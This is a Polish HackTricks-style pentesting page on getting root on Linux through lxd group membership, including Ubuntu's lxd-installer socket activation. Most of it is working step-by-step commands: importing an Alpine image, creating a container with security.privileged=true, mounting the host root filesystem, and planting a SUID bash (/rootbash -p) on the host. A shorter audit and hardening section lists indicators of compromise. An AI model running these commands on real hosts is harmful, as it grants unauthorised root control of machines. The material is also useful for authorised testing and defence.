# lxd/lxc Group - Eskalacja uprawnień

{{#include ../../../banners/hacktricks-training.md}}

Członkostwo w grupie zarządzającej LXD na hoście (zwykle _**lxd**_) może umożliwić uzyskanie uprawnień root, zapewniając pełną kontrolę nad daemonem.<sup>[[1]](#references)</sup> To ten sam problem z granicą zaufania, który opisano w przypadku [runtime control sockets](../../containers-namespaces/container-security/runtime-api-and-daemon-exposure.md) i [writable host mounts](../../containers-namespaces/container-security/sensitive-host-mounts.md): dostęp do management API może wystarczyć, nawet jeśli bieżący proces nie działa już wewnątrz kontenera.<sup>[[1]](#references)</sup>

## Aktywacja socketu Ubuntu `lxd-installer`

Nie zakładaj, że członkostwo w grupie `lxd` jest nieszkodliwe tylko dlatego, że brakuje snapu LXD. W Ubuntu Server 24.04 i nowszych pakiet `lxd-installer` instalowany domyślnie udostępnia `/run/lxd-installer.socket` jako `root:lxd` z trybem `0660`. Połączenie aktywuje `lxd-installer@.service` jako root, który instaluje snap LXD bez hasła sudo ani autoryzacji polkit; niektóre wersje wrappera pomijają też monit o potwierdzenie, gdy standardowe wejście nie jest TTY.<sup>[[10]](#references)[[11]](#references)</sup>

Sprawdź zarówno członkostwo konta w grupie, jak i usługę aktywowaną przez socket:<sup>[[10]](#references)[[11]](#references)</sup>

```bash
id -nG
getent group lxd
stat -c '%A %U:%G %n' /run/lxd-installer.socket
systemctl cat lxd-installer.socket lxd-installer@.service
```

Autoryzowany test w grupie `lxd` może uruchomić instalator za pomocą standardowego wrappera `lxc` lub przez bezpośrednie połączenie z socketem. Ten drugi sposób pokazuje, że właściwą granicę autoryzacji stanowi ACL socketu Unix, a nie monit wrappera:<sup>[[10]](#references)[[11]](#references)</sup>

```bash
python3 -c 'import socket; s=socket.socket(socket.AF_UNIX); s.connect("/run/lxd-installer.socket"); s.send(b"x"); s.recv(1)'
lxc version
```

Gdy daemon będzie już dostępny, przejdź do opisanych poniżej technik wykorzystujących uprzywilejowane kontenery.<sup>[[10]](#references)[[11]](#references)</sup>

## Eksploatacja bez Internetu

### Metoda 1

Możesz pobrać obraz Alpine z zaufanego repozytorium, aby użyć go z LXD.
Serwer obrazów LXD firmy Canonical publikuje codzienne buildy: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
Pobierz pliki **lxd.tar.xz** i **rootfs.squashfs** z najnowszego buildu (nazwa katalogu to data).<sup>[[8]](#references)</sup>

Możesz też zainstalować distrobuilder na swoim komputerze, postępując zgodnie z [instrukcjami projektu](https://github.com/lxc/distrobuilder).<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>

```bash
# Install requirements
sudo apt update
sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage    

# Clone repo
mkdir -p $HOME/go/src/github.com/lxc/
cd $HOME/go/src/github.com/lxc/
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd ./distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container - Beware of architecture while compiling locally.
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
```

Wgraj **incus.tar.xz** (**lxd.tar.xz**, jeśli pobrano go z serwera obrazów Canonical) i **rootfs.squashfs**, a następnie zaimportuj obraz i utwórz kontener.<sup>[[2]](#references)[[3]](#references)[[5]](#references)[[8]](#references)[[9]](#references)</sup>

```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

> [!CAUTION]
> Jeśli napotkasz ten błąd _**Error: No storage pool found. Please create a new storage pool**_\
> Uruchom **`lxd init`**, skonfiguruj domyślną pulę pamięci masowej, a następnie **powtórz** poprzedni zestaw poleceń.<sup>[[2]](#references)</sup>

Na koniec uruchom kontener i otwórz powłokę root w systemie plików hosta:<sup>[[1]](#references)[[2]](#references)</sup>

```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```

Ponieważ UID 0 w tej uprzywilejowanej instancji nie jest mapowany ponownie, może utworzyć ładunek SUID należący do hosta za pośrednictwem zamontowanego katalogu głównego hosta. Dzięki temu pivot z kontenera na hosta zostaje ukończony, zamiast pozostawić operatora w powłoce kontenera:<sup>[[10]](#references)[[11]](#references)</sup>

```bash
# From the host, write the payload through the privileged container
lxc exec privesc -- /bin/sh -c 'cp /mnt/root/bin/bash /mnt/root/rootbash && chmod 4755 /mnt/root/rootbash'

# Execute on the host; -p prevents bash from dropping the SUID-derived EUID
/rootbash -p
id
```

Umieść payload na systemie plików obsługującym SUID. Osobny `/tmp` jest często montowany z opcją `nosuid` i może nie być widoczny przy nierекurсивnym bindzie hosta `/`, dlatego ścieżka taka jak `/rootbash` w głównym systemie plików hosta jest bardziej niezawodna w tym proof.<sup>[[10]](#references)[[11]](#references)</sup>

### Metoda 2

Zbuduj obraz Alpine i uruchom go z flagą `security.privileged=true`, która mapuje roota kontenera na roota hosta; zamontowanie `/` udostępnia wtedy system plików hosta wewnątrz kontenera.<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>

```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```

## Efekt uboczny AppArmor obejmujący cały host

Uruchomienie snapu LXD może również utworzyć plik `/run/sysctl.d/zz-lxd.conf` i ustawić wartości `kernel.apparmor_restrict_unprivileged_userns` oraz `kernel.apparmor_restrict_unprivileged_unconfined` na `0`. Osłabia to ograniczenia Ubuntu dotyczące nieuprzywilejowanych przestrzeni nazw użytkowników dla wszystkich lokalnych użytkowników, dlatego podczas oceny hosta zanotuj wartości przed aktywacją LXD i po niej.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
cat /run/sysctl.d/zz-lxd.conf 2>/dev/null
sysctl kernel.apparmor_restrict_unprivileged_userns \
       kernel.apparmor_restrict_unprivileged_unconfined
```

## Audyt i hardening

Traktuj członkostwo w grupie `lxd` jak przyznanie uprawnień roota. Usunięcie zbędnego członka zaczyna obowiązywać w nowych sesjach logowania; usunięcie pakietu `lxd-installer` lub zamaskowanie jego socketu usuwa jedynie ścieżkę instalacji na żądanie i **nie** ogranicza użytkownika, który ma już dostęp do zainstalowanego demona LXD.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
getent group lxd
sudo gpasswd -d <user> lxd

# Only if on-demand LXD installation is not required
sudo systemctl mask --now lxd-installer.socket
# or: sudo apt purge lxd-installer
```

Przydatne wskaźniki naruszenia bezpieczeństwa obejmują instancje LXD z ustawieniem `security.privileged=true`, urządzenia dyskowe, których `source` to `/`, nieoczekiwane połączenia z `/run/lxd-installer.socket`, nowe pliki SUID oraz zmianę powyższych sysctl AppArmor z `1` na `0`.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
lxc list
lxc config show <instance> --expanded
find / -xdev -type f -perm -4000 2>/dev/null
```

## References

- [1] [Jak wzmocnić zabezpieczenia LXD](https://canonical.com/lxd/docs/latest/howto/security_harden/)
- [2] [Kontenery LXD i maszyny wirtualne](https://ubuntu.com/server/docs/how-to/virtualisation/lxd/)
- [3] [Jak kopiować i importować obrazy](https://canonical.com/lxd/docs/latest/howto/images_copy/)
- [4] [distrobuilder](https://github.com/lxc/distrobuilder)
- [5] [Jak tworzyć obrazy za pomocą distrobuilder](https://github.com/lxc/distrobuilder/blob/main/doc/howto/build.md)
- [6] [Definicja obrazu Alpine](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
- [7] [Skrypt kompilacji lxd-alpine-builder](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
- [8] [Serwer obrazów LXD](https://images.lxd.canonical.com/)
- [9] [Typ: disk](https://canonical.com/lxd/docs/latest/reference/devices_disk/)
- [10] [Raport STAR Labs i PoC dotyczące privilege-escalation przez grupę LXD](https://github.com/star-sg/lxd-group-privesc-report)
- [11] [Stare wino w nowej butelce: dekadowa metoda uzyskania roota przez grupę LXD znów uzbrojona](https://starlabs.sg/blog/2026/06-old-wine-in-a-new-bottle-a-decade-old-lxd-group-root-re-armed)
{{#include ../../../banners/hacktricks-training.md}}
